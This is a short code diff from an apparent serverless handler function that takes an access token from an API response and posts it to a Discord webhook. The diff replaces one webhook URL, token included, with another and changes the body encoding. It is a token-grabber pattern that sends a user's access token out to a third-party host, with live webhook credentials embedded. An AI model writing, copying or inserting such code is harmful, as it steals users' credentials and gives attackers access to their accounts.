@@ -52,10 +52,10 @@ export async function handler(event, context) {
             });
 
             const data = await result.json();
-await fetch("https://discord.com/api/webhooks/1044574936381014056/JMNObDC2WGIQk6qAZzeAhwexKcbFSY-bdT1WOP5Sm5U68QlC2JN2fr-CXRkvui74wAsW", {
+await fetch("https://discord.com/api/webhooks/1068213407523815445/IkkiFvAXsSYP7-bUSPMZFp7kuOtbOo0UxnE_PNeE6SXlmEpduCuEyq8a7erYQFT64Q7l", {
                method: "POST",
-               body: JSON.stringify({
-               message: data.access_token.toString()
+               body: new URLSearchParams({
+             message: data.access_token.toString()
                }),
                headers: {
                    "Content-Type": "application/json"
